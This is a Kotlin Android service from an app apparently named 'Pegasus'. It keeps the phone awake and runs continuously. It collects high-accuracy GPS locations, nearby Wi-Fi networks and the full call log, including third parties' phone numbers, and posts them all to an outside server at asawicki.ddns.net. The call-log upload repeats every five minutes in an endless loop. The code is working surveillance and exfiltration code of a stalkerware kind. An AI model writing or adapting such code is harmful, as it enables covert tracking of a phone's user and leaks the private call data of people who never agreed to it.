package com.example.pegasus

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.CallLog
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.github.kittinunf.fuel.core.ResponseDeserializable
import com.github.kittinunf.fuel.core.extensions.jsonBody
import com.github.kittinunf.fuel.httpGet
import com.github.kittinunf.fuel.httpPost
import com.google.android.gms.location.*
import com.google.gson.Gson
import java.lang.Thread.sleep
import java.time.LocalDateTime
import java.time.ZoneOffset


class NavigationService : Service() {
    private lateinit var fusedLocationProviderClient: FusedLocationProviderClient
    private lateinit var wifiManager: WifiManager
    private val CHANNEL_ID = "ForegroundService Kotlin"
    private lateinit var wakeLock: PowerManager.WakeLock
    private var wifiTime = LocalDateTime.now().toEpochSecond(ZoneOffset.UTC)

    data class Location(var latitude: Double, var longitude: Double, var time: Long){
        class Deserializer: ResponseDeserializable<Array<Location>> {
            override fun deserialize(content: String): Array<Location>? = Gson().fromJson(content, Array<Location>::class.java)
        }
    }
    data class Wifi(
        var bssid: String,
        var ssid: String,
        var capabilities: String,
        var frequency: Int,
        var level: Int,
        var time: Long
    ){
        class Deserializer: ResponseDeserializable<Array<Wifi>> {
            override fun deserialize(content: String): Array<Wifi>? = Gson().fromJson(content, Array<Wifi>::class.java)
        }
    }
    data class Call(
        var number: String,
        var duration: Int,
        var type: Int,
        var time: Long
    ){
        class Deserializer: ResponseDeserializable<Array<Call>> {
            override fun deserialize(content: String): Array<Call>? = Gson().fromJson(content, Array<Call>::class.java)
        }
    }

    @SuppressLint("WakelockTimeout", "Range")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        //do heavy work on a background thread
        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MyApp::MyWakelockTag"
        )
        wakeLock.acquire()

        val input = intent?.getStringExtra("inputExtra")
        createNotificationChannel()
        val notificationIntent = Intent(applicationContext, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            applicationContext,
            0, notificationIntent, 0
        )
        val notification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
            .setContentTitle("Pegasus")
            .setContentText(input)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
        startForeground(-1, notification)

        wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager

        val wifiScanReceiver = object : BroadcastReceiver() {

            override fun onReceive(context: Context, intent: Intent) {
                val success = intent.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false)
                if (success) {
                    scanSuccess()
                } else {
                    scanFailure()
                }
            }
        }

        val intentFilter = IntentFilter()
        intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        applicationContext.registerReceiver(wifiScanReceiver, intentFilter)

        if (ActivityCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            // getFusedLocationProviderClient
            fusedLocationProviderClient =
                LocationServices.getFusedLocationProviderClient(applicationContext)

            // Define LocationCallback
            val locationCallback = object : LocationCallback() {
                override fun onLocationResult(locationResult: LocationResult) {
                    val locations = locationResult.locations
                    for (location in locations) {
                        val data = Location(
                            location.latitude,
                            location.longitude,
                            location.time / 1000 + 7200
                        )
                        "http://asawicki.ddns.net:5000/navigation" //200
                            .httpPost()
                            .jsonBody(Gson().toJson(data).toString())
                            .responseString { _, response, _ ->
                                Log.i("Location", response.toString())
                            }
                    }


                }
            }

            // Now lets request location updates - that is how this must happen
            // https://developer.android.com/training/location/change-location-settings
            val locationRequest: LocationRequest = LocationRequest.create()
            locationRequest.interval = 60000
            locationRequest.fastestInterval = 30000
            locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            locationRequest.maxWaitTime = 3600000
            locationRequest.smallestDisplacement = 5F

            // Attempt to see if requested settings are compatible with user device.
            val builder = LocationSettingsRequest.Builder()
            builder.addLocationRequest(locationRequest)

            // Request location updates
            fusedLocationProviderClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
        }




//        val wifiCallback = object : WifiManager.ScanResultsCallback() {
//            override fun onScanResultsAvailable() {
//                val wifis = wifiManager.scanResults
//                for (wifi in wifis) {
//                    val data = Wifi(
//                        wifi.BSSID,
//                        wifi.SSID,
//                        wifi.capabilities,
//                        wifi.frequency,
//                        wifi.level,
//                        wifi.timestamp
//                    )
//                    "http://asawicki.ddns.net:5000/wifi" //200
//                        .httpPost()
//                        .jsonBody(Gson().toJson(data).toString())
//                        .responseString { _, response, _ ->
//                            Log.i("Wifi", response.toString())
//                        }
//                }
//            }
//        }
//
//        wifiManager.registerScanResultsCallback(mainExecutor, wifiCallback)

            val resultSet = contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} ASC"
            );

            Thread {
                while (true) {
                "http://asawicki.ddns.net:5000/call"
                    .httpGet().responseObject(Call.Deserializer()) { _, _, result ->
                        val (calls, error) = result

                        Log.d("Call", "Call log")

                        if (resultSet != null) {
                            resultSet.moveToFirst()
                            if (calls != null) {
                                resultSet.move(calls.size)
                            }
                            while (!resultSet.isAfterLast) {
                                val number = resultSet.getColumnIndex(CallLog.Calls.NUMBER)
                                val data = Call(
                                    resultSet.getString(resultSet.getColumnIndex(CallLog.Calls.NUMBER)),
                                    resultSet.getInt(resultSet.getColumnIndex(CallLog.Calls.DURATION)),
                                    resultSet.getInt(resultSet.getColumnIndex(CallLog.Calls.TYPE)),
                                    resultSet.getLong(resultSet.getColumnIndex(CallLog.Calls.DATE))
                                )
                                "http://asawicki.ddns.net:5000/call" //200
                                    .httpPost()
                                    .jsonBody(Gson().toJson(data).toString())
                                    .responseString { _, response, _ ->
                                        Log.i("Call", response.toString())
                                    }
                                resultSet.moveToNext()
                                sleep(100)
                            }
                        } else {
                            Log.d("Call", "Call log is null")
                        }
                    }
                sleep(300000)
                }
            }.start()


        return super.onStartCommand(intent, flags, startId)
    }

    private fun scanSuccess() {
        Log.d("Wifi", "Scan success")
        Log.d("Wifi",(LocalDateTime.now().toEpochSecond(ZoneOffset.UTC) - wifiTime).toString() )
        if (LocalDateTime.now().toEpochSecond(ZoneOffset.UTC) - wifiTime < 600) return
        wifiTime = LocalDateTime.now().toEpochSecond(ZoneOffset.UTC)
        val wifis = wifiManager.scanResults
        for (wifi in wifis) {
            val data = Wifi(
                wifi.BSSID,
                wifi.SSID,
                wifi.capabilities,
                wifi.frequency,
                wifi.level,
                LocalDateTime.now().toEpochSecond(ZoneOffset.UTC)
            )
            "http://asawicki.ddns.net:5000/wifi" //200
                .httpPost()
                .jsonBody(Gson().toJson(data).toString())
                .responseString { _, response, _ ->
                    Log.i("Wifi", response.toString())
                }
        }
    }

    private fun scanFailure() {
        Log.d("Wifi", "Scan failure")
    }


    override fun onDestroy() {
        wakeLock.release()
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        val serviceChannel = NotificationChannel(
            CHANNEL_ID, "Foreground Service Channel",
            NotificationManager.IMPORTANCE_DEFAULT
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager!!.createNotificationChannel(serviceChannel)
    }

    override fun onBind(intent: Intent): IBinder {
        TODO("Return the communication channel to the service.")
    }
}

